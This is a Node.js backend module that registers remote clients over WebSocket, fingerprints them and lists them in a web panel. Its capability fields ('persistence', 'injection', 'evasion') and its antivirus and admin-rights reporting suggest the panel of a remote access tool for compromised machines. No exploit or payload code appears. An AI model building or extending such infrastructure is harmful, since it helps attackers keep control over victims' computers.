/**
 * Integration Layer
 * 
 * This module provides a clear interface for communication between:
 * 1. Backend and Web Panel
 * 2. Backend and Client components
 * 
 * By centralizing the integration points, we ensure proper segregation
 * and make future changes easier to implement.
 */

const Client = require('../models/Client');

// Platform detection utilities
function detectOperatingSystem(platformString, userAgent) {
    if (!platformString && !userAgent) return 'unknown';
    
    const combined = `${platformString || ''} ${userAgent || ''}`.toLowerCase();
    
    if (combined.includes('windows')) return 'windows';
    if (combined.includes('linux')) return 'linux';
    if (combined.includes('macos') || combined.includes('darwin')) return 'macos';
    if (combined.includes('android')) return 'android';
    if (combined.includes('ios')) return 'ios';
    
    return 'unknown';
}

function detectArchitecture(platformString, systemInfo) {
    if (!platformString && !systemInfo) return 'unknown';
    
    const combined = `${platformString || ''} ${JSON.stringify(systemInfo || {})}`.toLowerCase();
    
    if (combined.includes('x64') || combined.includes('amd64') || combined.includes('x86_64')) return 'x64';
    if (combined.includes('arm64') || combined.includes('aarch64')) return 'arm64';
    if (combined.includes('arm')) return 'arm';
    if (combined.includes('x86') || combined.includes('i386') || combined.includes('i686')) return 'x86';
    
    return 'unknown';
}

/**
 * Client Integration Functions
 */
const clientIntegration = {
  /**
   * Register a new client in the system
   * @param {Object} clientData - Client registration data
   * @returns {Promise<Object>} Registered client object
   */
  registerClient: async (clientData) => {
    try {
      console.log('registerClient called with data:', clientData);
      console.log('Machine fingerprint:', clientData.machineFingerprint);
      
      // Extract system info for fingerprinting and uptime
      const systemInfo = clientData.systemInfo || {};
      const uptimeSeconds = systemInfo.uptime || 0;
      const bootTime = systemInfo.bootTime ? new Date(systemInfo.bootTime) : null;
      
      // Check for existing client by UUID first
      let client = await Client.findOne({ uuid: clientData.uuid });
      
      if (client) {
        console.log('Updating existing client by UUID:', client.uuid);
        // Update existing client
        client.computerName = clientData.computerName || client.computerName;
        client.ipAddress = clientData.ipAddress || client.ipAddress;
        client.hostname = clientData.hostname || client.hostname;
        client.platform = clientData.platform || client.platform;
        client.operatingSystem = detectOperatingSystem(clientData.platform, clientData.userAgent) || client.operatingSystem || 'unknown';
        client.machineFingerprint = clientData.machineFingerprint || client.machineFingerprint;
        client.uptimeSeconds = uptimeSeconds;
        client.bootTime = bootTime || client.bootTime;
        client.connectedAt = new Date();
        
        // Properly update capabilities structure
        if (!client.capabilities) {
          client.capabilities = {
            persistence: [],
            injection: [],
            evasion: [],
            commands: [],
            features: []
          };
        }
        if (clientData.capabilities && Array.isArray(clientData.capabilities)) {
          console.log('Setting capabilities.features to:', clientData.capabilities);
          client.capabilities.features = clientData.capabilities;
        } else {
          console.log('No valid capabilities array found, keeping empty features array');
        }
        client.additionalSystemDetails = clientData.additionalSystemDetails || client.additionalSystemDetails;
        client.status = 'online';
        client.lastActiveTime = new Date();
        client.lastHeartbeat = new Date();
        
        await client.save();
        console.log('Existing client updated successfully');
        return client;
      }
      
      // Check for existing client by machine fingerprint
      if (clientData.machineFingerprint) {
        client = await Client.findOne({ machineFingerprint: clientData.machineFingerprint });
        
        if (client) {
          console.log('Found existing client by machine fingerprint:', client.machineFingerprint);
          console.log('Updating UUID from', client.uuid, 'to', clientData.uuid);
          
          // Update the existing client with new UUID and current data
          client.uuid = clientData.uuid; // Update UUID
          client.computerName = clientData.computerName || client.computerName;
          client.ipAddress = clientData.ipAddress || client.ipAddress;
          client.hostname = clientData.hostname || client.hostname;
          client.platform = clientData.platform || client.platform;
          client.operatingSystem = detectOperatingSystem(clientData.platform, clientData.userAgent) || client.operatingSystem || 'unknown';
          client.uptimeSeconds = uptimeSeconds;
          client.bootTime = bootTime || client.bootTime;
          client.connectedAt = new Date();
          
          // Update capabilities
          if (!client.capabilities) {
            client.capabilities = {
              persistence: [],
              injection: [],
              evasion: [],
              commands: [],
              features: []
            };
          }
          if (clientData.capabilities && Array.isArray(clientData.capabilities)) {
            client.capabilities.features = clientData.capabilities;
          }
          
          client.additionalSystemDetails = clientData.additionalSystemDetails || client.additionalSystemDetails;
          client.status = 'online';
          client.lastActiveTime = new Date();
          client.lastHeartbeat = new Date();
          
          await client.save();
          console.log('Client updated with new UUID successfully');
          return client;
        }
      }
      
      // Create new client
      console.log('Creating new client with uuid:', clientData.uuid);
      console.log('Creating new client with machine fingerprint:', clientData.machineFingerprint);
      
      const newClient = new Client({
        uuid: clientData.uuid,
        machineFingerprint: clientData.machineFingerprint,
        computerName: clientData.computerName || 'Unknown Computer',
        ipAddress: clientData.ipAddress || '0.0.0.0',
        hostname: clientData.hostname,
        platform: clientData.platform,
        operatingSystem: detectOperatingSystem(clientData.platform, clientData.userAgent),
        osVersion: 'Unknown',
        architecture: detectArchitecture(clientData.platform, clientData.systemInfo),
        uptimeSeconds: uptimeSeconds,
        bootTime: bootTime,
        connectedAt: new Date(),
        capabilities: {
          persistence: [],
          injection: [],
          evasion: [],
          commands: [],
          features: Array.isArray(clientData.capabilities) ? clientData.capabilities : []
        },
        additionalSystemDetails: clientData.additionalSystemDetails,
        status: 'online',
        lastActiveTime: new Date(),
        lastHeartbeat: new Date()
      });
      
      console.log('New client capabilities before save:', newClient.capabilities.features);
      await newClient.save();
      console.log('New client capabilities after save:', newClient.capabilities.features);
      return newClient;
    } catch (error) {
      console.error('Error registering client:', error);
      throw error;
    }
  },
  
  /**
   * Update client heartbeat
   * @param {String} uuid - Client UUID
   * @returns {Promise<Object>} Updated client object
   */
  updateClientHeartbeat: async (uuid, systemInfo = {}) => {
    try {
      const now = new Date();
      const uptimeSeconds = systemInfo.uptime || 0;
      const bootTime = systemInfo.bootTime ? new Date(systemInfo.bootTime) : null;
      
      const client = await Client.findOneAndUpdate(
        { uuid },
        { 
          $set: { 
            status: 'online',
            lastActiveTime: now,
            lastHeartbeat: now,
            uptimeSeconds: uptimeSeconds,
            ...(bootTime && { bootTime: bootTime })
          } 
        },
        { new: true }
      );
      
      return client;
    } catch (error) {
      console.error('Error updating client heartbeat:', error);
      throw error;
    }
  },
  
  /**
   * Get all clients
   * @returns {Promise<Array>} List of all clients
   */
  getAllClients: async () => {
    try {
      return await Client.find({});
    } catch (error) {
      console.error('Error getting all clients:', error);
      throw error;
    }
  }
};

/**
 * Web Panel Integration Functions
 */
const webPanelIntegration = {
  /**
   * Format client data for web panel
   * @param {Object} client - Client object from database
   * @returns {Object} Formatted client data for web panel
   */
  formatClientForWebPanel: (client) => {
    // Determine online status based on lastHeartbeat (within 2 minutes = online)
    const twoMinutesAgo = new Date(Date.now() - 2 * 60 * 1000);
    const isOnline = client.status === 'online' && client.lastHeartbeat && new Date(client.lastHeartbeat) > twoMinutesAgo;
    
    // Format uptime display
    let uptimeDisplay = '';
    if (isOnline && client.uptimeSeconds) {
      const days = Math.floor(client.uptimeSeconds / 86400);
      const hours = Math.floor((client.uptimeSeconds % 86400) / 3600);
      const minutes = Math.floor((client.uptimeSeconds % 3600) / 60);
      
      if (days > 0) {
        uptimeDisplay = `${days}d ${hours}h ${minutes}m`;
      } else if (hours > 0) {
        uptimeDisplay = `${hours}h ${minutes}m`;
      } else {
        uptimeDisplay = `${minutes}m`;
      }
    }
    
    // Format OS version
    let osVersion = 'Unknown';
    if (client.osVersion && client.osVersion !== 'Unknown') {
      osVersion = client.osVersion;
    } else if (client.platform) {
      // Extract OS version from platform string
      const platformLower = client.platform.toLowerCase();
      if (platformLower.includes('windows 11')) {
        osVersion = 'Windows 11';
      } else if (platformLower.includes('windows 10')) {
        osVersion = 'Windows 10';
      } else if (platformLower.includes('windows')) {
        osVersion = 'Windows';
      } else if (platformLower.includes('linux')) {
        osVersion = 'Linux';
      } else if (platformLower.includes('macos') || platformLower.includes('darwin')) {
        osVersion = 'macOS';
      }
    }
    
    // Format antivirus info
    let antivirus = 'Unknown';
    if (client.systemInfo && client.systemInfo.antivirus && Array.isArray(client.systemInfo.antivirus)) {
      antivirus = client.systemInfo.antivirus.join(', ') || 'None detected';
    } else if (client.systemInfo && client.systemInfo.antivirus) {
      antivirus = client.systemInfo.antivirus;
    }
    
    // Format admin privilege
    let isAdmin = false;
    if (client.systemInfo && client.systemInfo.isAdmin !== undefined) {
      isAdmin = client.systemInfo.isAdmin;
    }
    
    // Format country with better accuracy
    let country = 'Unknown';
    if (client.geoLocation && client.geoLocation.country) {
      country = client.geoLocation.country;
    } else if (client.country && client.country !== 'Unknown') {
      country = client.country;
    }
    
    return {
      uuid: client.uuid,
      computerName: client.computerName || 'Unknown',
      ipAddress: client.ipAddress || client.ip || 'Unknown',
      country: country,
      status: isOnline ? 'online' : 'offline',
      lastActiveTime: client.lastActiveTime ? 
        client.lastActiveTime.toISOString().split('T')[0] : 
        (client.lastSeen ? client.lastSeen.toISOString().split('T')[0] : 'Never'),
      uptime: uptimeDisplay,
      bootTime: client.bootTime ? client.bootTime.toISOString() : null,
      additionalSystemDetails: client.additionalSystemDetails || client.platform || 'Unknown',
      // Enhanced fields
      osVersion: osVersion,
      antivirus: antivirus,
      isAdmin: isAdmin,
      hwid: client.machineFingerprint || client.uuid,
      // Legacy fields for backward compatibility
      hostname: client.hostname,
      platform: client.platform,
      lastSeen: client.lastSeen,
      lastHeartbeat: client.lastHeartbeat,
      createdAt: client.createdAt
    };
  },
  
  /**
   * Format client list for web panel
   * @param {Array} clients - List of client objects
   * @returns {Array} Formatted client list for web panel
   */
  formatClientListForWebPanel: (clients) => {
    return clients.map(client => webPanelIntegration.formatClientForWebPanel(client));
  }
};

/**
 * WebSocket Message Handlers
 */
const websocketHandlers = {
  /**
   * Handle client registration via WebSocket
   * @param {Object} data - Registration data
   * @param {Object} ws - WebSocket connection
   * @returns {Promise<Object>} Registered client
   */
  handleClientRegistration: async (data, ws) => {
    try {
      const client = await clientIntegration.registerClient(data);
      ws.uuid = client.uuid;
      ws.clientType = 'client';
      return client;
    } catch (error) {
      console.error('Error handling client registration:', error);
      throw error;
    }
  },
  
  /**
   * Handle client heartbeat via WebSocket
   * @param {Object} data - Heartbeat data
   * @returns {Promise<Object>} Updated client
   */
  handleClientHeartbeat: async (data) => {
    try {
      return await clientIntegration.updateClientHeartbeat(data.uuid, data.systemInfo);
    } catch (error) {
      console.error('Error handling client heartbeat:', error);
      throw error;
    }
  }
};

module.exports = {
  clientIntegration,
  webPanelIntegration,
  websocketHandlers
};